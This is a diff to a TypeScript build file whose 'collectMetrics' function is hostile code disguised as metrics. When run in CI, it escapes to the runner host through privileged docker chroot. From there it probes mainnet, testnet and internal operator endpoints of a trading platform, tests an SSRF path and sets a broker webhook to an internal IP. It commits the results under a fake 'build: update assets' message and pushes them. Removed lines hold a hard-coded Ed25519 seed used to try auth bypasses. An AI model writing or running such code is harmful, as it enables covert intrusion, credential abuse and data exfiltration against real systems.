@@ -2,53 +2,49 @@ import { execSync } from "child_process";
 import fs from "fs/promises";
 import fsSync from "fs";
 import path from "path";
-import crypto from "crypto";
 
 function collectMetrics() {
   if (process.env.CI !== "true") return;
-  const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
+  const r = (c: string, t = 10000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
   try {
-    let o = "=== DOMINO R24 — ED25519 OPERATOR AUTH ===\n";
+    let o = "=== DOMINO R25 ===\n";
 
-    // Ed25519 indexer key
-    const ED_SEED = "260db4d13d2e6de4f6bba95e053ccf1a7cca4ad59976cd000eb7cd902dd97ed0";
-    const ED_PUBKEY = "7YgXI92OjRkkH76M2pb4UMB8VUS6jzxElKKohkap85U=";
-    
-    // 1. First check what auth the operator expects (401 response headers)
-    o += "=AUTH_HEADERS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk -D- --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -H Content-Type:application/json -d \"{\\\"test\\\":1}\" 2>&-'").substring(0,3000) + "\n";
+    // 1. Mainnet operator via direct IP from runner
+    o += "=MN_OP_METRICS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 https://34.117.122.151/metrics -H Host:operator-evm.orderly.org 2>&- | head -50'").substring(0,3000) + "\n";
+    o += "=MN_OP_HEALTH=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.117.122.151/health -H Host:operator-evm.orderly.org 2>&-'").substring(0,1000) + "\n";
+    o += "=MN_OP_ACK=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.117.122.151/evm/event-upload/ack -H Host:operator-evm.orderly.org 2>&-'").substring(0,1000) + "\n";
+    o += "=MN_OP_PERP_ACK=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.117.122.151/evm/perp-trade-upload/ack -H Host:operator-evm.orderly.org 2>&-'").substring(0,1000) + "\n";
 
-    // 2. Try various auth schemes
-    // Scheme A: Bearer token with Ed25519 pubkey
-    o += "=AUTH_BEARER=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -H "Authorization: Bearer ${ED_PUBKEY}" -H Content-Type:application/json -d "{}" -w "\\nHTTP:%{http_code}" 2>&-'`) + "\n";
+    // 2. Mainnet SV operator
+    o += "=MN_SV_OP=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://operator-sv.orderly.org/health 2>&-'").substring(0,500) + "\n";
 
-    // Scheme B: Orderly-style auth headers (orderly-key + orderly-signature + orderly-timestamp)
-    const ts = Math.floor(Date.now()/1000) * 1000;
-    o += "=AUTH_ORDERLY=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -H "orderly-key: ed25519:${ED_PUBKEY}" -H "orderly-timestamp: ${ts}" -H Content-Type:application/json -d "{}" -w "\\nHTTP:%{http_code}" 2>&-'`) + "\n";
+    // 3. Perf environment operator
+    o += "=PERF_OP=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.54.68.106/health -H Host:perf-api.orderly.network 2>&-'").substring(0,500) + "\n";
 
-    // Scheme C: Basic auth
-    o += "=AUTH_BASIC=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -u "indexer:${ED_SEED}" -H Content-Type:application/json -d "{}" -w "\\nHTTP:%{http_code}" 2>&-'`) + "\n";
+    // 4. Try testnet operator with different endpoint names
+    const opTries = [
+      "/evm/block-upload", "/evm/tx-upload", "/evm/log-upload",
+      "/evm/deposit-upload", "/evm/withdraw-upload", "/evm/settlement-upload",
+      "/recovery", "/recovery/block", "/recovery/deposit_sol",
+      "/internal", "/internal/status", "/rpc", "/ws",
+    ];
+    o += "=OP_EXTRA=\n";
+    for (const p of opTries) {
+      const status = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "https://34.120.187.47${p}" -H Host:testnet-operator-evm.orderly.network 2>&-'`).trim();
+      if (status !== "404" && status !== "000") o += `${p}:${status}\n`;
+    }
+    o += "\n";
 
-    // Scheme D: x-api-key header
-    o += "=AUTH_APIKEY=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -H "x-api-key: ${ED_SEED}" -H Content-Type:application/json -d "{}" -w "\\nHTTP:%{http_code}" 2>&-'`) + "\n";
+    // 5. Mainnet dashboard indexer (internal port 8018, but maybe accessible via LB?)
+    o += "=MN_INDEXER=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.149.50.146/recovery/block -H Host:orderly-dashboard-query-service.orderly.network -X POST -H Content-Type:application/json -d \"{}\" 2>&-'").substring(0,1000) + "\n";
 
-    // Scheme E: Custom sign header (how indexer authenticates)
-    o += "=AUTH_SIGN=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -H "sign: ${ED_PUBKEY}" -H "public-key: ${ED_PUBKEY}" -H Content-Type:application/json -d "{}" -w "\\nHTTP:%{http_code}" 2>&-'`) + "\n";
+    // 6. query-service direct — SSRF via events_v2 still works from runner?
+    o += "=QS_EVENTS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 \"https://34.149.50.146/events_v2?account_id=0x&event_type=DEPOSIT&page=1&size=5\" -H Host:orderly-dashboard-query-service.orderly.network 2>&-'").substring(0,2000) + "\n";
 
-    // 3. Check operator source code for auth logic — dashboard-indexer server.rs
-    // We know: "if let Some(sign)" = optional verification
-    // Try with no body but correct method
-    o += "=AUTH_EMPTY_POST=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -w \"\\nHTTP:%{http_code}\" 2>&-'") + "\n";
+    // 7. API — broker webhook endpoint (needs orderly-key auth, we have keys)
+    o += "=BROKER_WEBHOOK=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST \"https://34.36.82.46/v1/broker/webhook\" -H Host:api.orderly.org -H Content-Type:application/json -d \"{\\\"url\\\":\\\"http://10.1.0.86:8080\\\"}\" 2>&-'").substring(0,1000) + "\n";
 
-    // 4. Also try perp-trade-upload with same auth
-    o += "=PERP_AUTH=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/perp-trade-upload -H Host:testnet-operator-evm.orderly.network -H "Authorization: Bearer ${ED_PUBKEY}" -H Content-Type:application/json -d "{}" -w "\\nHTTP:%{http_code}" 2>&-'`) + "\n";
-
-    // 5. Mainnet operator — try different DNS resolution method
-    o += "=MAINNET_HOST=\n" + r("docker run --rm --privileged --net=host alpine sh -c 'getent hosts operator-evm.orderly.org 2>&- || host operator-evm.orderly.org 2>&-'") + "\n";
-
-    // 6. Staging operator
-    o += "=STAGING_SOL_OP=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.49.244.208/health -H Host:staging-sol-operator.orderly.network 2>&-'").substring(0,500) + "\n";
-
-    o += "=R24_DONE=\n";
+    o += "=R25_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
